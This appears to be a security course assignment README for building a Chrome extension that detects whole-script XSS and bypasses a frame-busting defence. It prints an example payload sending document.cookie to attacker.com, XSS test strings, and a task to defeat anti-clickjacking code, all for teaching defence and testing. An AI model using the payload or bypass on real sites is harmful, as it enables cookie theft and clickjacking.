# WebSec-Browser-Extension

## Overview
The goal of this part is to help you understand how you can create a browser extension to defend against some known web application vulnerabilities. Browser extensions are small pieces of software installed in the browser to provide additional functionality to the users.

A browser extension comes with a set of functionalities. It can modify the DOM of the page you visit, modify or block a web request, access user cookies, and can execute a script in the context of the web page.

In this project, we will be creating a Chrome-based extension to detect and block a whole script XSS injection and bypass some client-side web-defense techniques.

## Background
This part involves creating a Chrome extension and using regular expressions to detect whole script XSS and bust frame-busting techniques.

### Whole Script XSS
A whole Script attack vector consists of a full JavaScript statement where an entire script is injected into the victimâ€™s page.

**Example:**
``` sh
<script>
document.location="http://attacker.com/saveCookie.php?cookie="+document.cookie;
</script>
```

To learn more about the whole script XSS, read this paper: Protection, Usability and Improvements in Reflected XSS Filters

### Frame Busting
An iframe is an HTML tag that allows embedding HTML content in a frame inside a normal HTML document.
Frame-busting is a technique that protects clients from clickjacking. It prevents web pages from being rendered inside a frame.
One method to prevent client-side clickjacking involves placing this snippet of JavaScript in each page:

```sh
<script>
if (top != self) top.location.href = location.href;
</script>
```

### Chrome Extension
The most important component of a Chrome browser extension is the manifest.json file. 
Here is a sample manifest.json file:
```sh
{
  "name": "CS6262 Extension",
  "description": "A simple extension",
  "version": "1.0",
  "permissions": [
    "tabs",
    "notifications"
  ],
  "background": {
    "scripts": ["background.js"],
    "persistent": false
  },
  "browser_action": {
    "default_title": "Does something",
    "default_icon": "icon.png",
    "default_popup": "popup.html"
  },
  "manifest_version": 2
}
```
There are various keys like browser_action, permissions, and background. You must include these keys as part the requirements of this extension.
For further information about the structure of a typical Chrome extension, refer to this link: https://developer.chrome.com/extensions/getstarted

The manifest.json file may contain other files as necessary. For instance, in the above sample, popup.html and background.js are two files included in manifest.json. This will be similar to how you will create your xss_detect.js and frame_bust.js files. The former should deals with the XSS detection and blocker parts while the latter contains bypassing the frame busting script.

For further reading, refer to https://developer.chrome.com/extensions/webRequest

### Task

Create a Google Chrome extension to:

1. Detect and block whole script XSS injection
    - The first step is detecting the Whole Script attack vectors. You should write a regular expression to catch all possible attack vectors which can be used in the input fields of a web page.
    - You can write the background JS file (as a part of the manifest.json) in such a way that it takes the URL as well as any POST data associated with the request, decodes it if necessary, and use the regular expression(s) to identify the XSS attack vectors.
    - Use webRequest and webRequestBlocking APIs. You should be working with the chrome.webRequest.onBeforeRequest.addListener function under which your whole script should be written for the detection of XSS.
2. Bypass the frame buster: https://www.prism.gatech.edu/~rgiri8/frame/frame_busted_page.html
    - For busting/bypassing the frame buster, there are two pages â€“ frame_busted_page.html and index.html under the directory: https://www.prism.gatech.edu/~rgiri8/frame.
    - Your extension (which contains frame_bust.js) should bypass the frame busting technique and frame the frame_busted_page.html page into the index.html (under frame directory) iframe.

To summarize, your task is to create an extension that blocks whole script XSS attacks and also bypasses an implemented frame busting technique as mentioned above.

If you are not familiar with browser extension development, check out the demo color changer Chrome extension in the demo-color-changer-chrome-extension folder.
Sample Inputs for XSS Detection
Below is a subset of inputs that we will test. You need to create your regular expression in such a way that all kinds of crafted attack vectors made by tweaking the script tags are detected.

### Sample examples That Should Be Blocked
```sh
<script> alert(); </script>
<<  ScRiPT   >alert("XSS");//<</ ScRiPT  >
```

### Examples That Should Pass
```sh
<script/script>
<scripting></scripting>
```
